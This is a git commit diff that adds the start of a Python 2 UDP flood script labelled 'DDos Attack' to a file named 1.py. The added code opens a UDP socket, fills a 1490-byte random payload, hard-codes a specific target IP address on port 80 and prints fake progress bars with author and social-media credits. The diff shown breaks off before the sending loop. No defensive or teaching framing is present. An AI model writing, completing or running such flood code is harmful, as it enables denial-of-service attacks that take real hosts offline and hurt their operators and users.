0c0ae88ff2fbdbd33a576faaaa0790e7375216a5
jiayou0203 <huoquan00022@163.com>
2019-06-27 16:33:11 +0800

    Update 1.py

--- 1.py
+++ 1.py
@@ -1,4 +1,40 @@
- "[==========          ] 50%"
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : HA-MRX"
+print "You Tube : https://www.youtube.com/c/HA-MRX"
+print "github   : https://github.com/Ha3MrX"
+print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print
+ip ="23.224.37.202"
+port =80
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
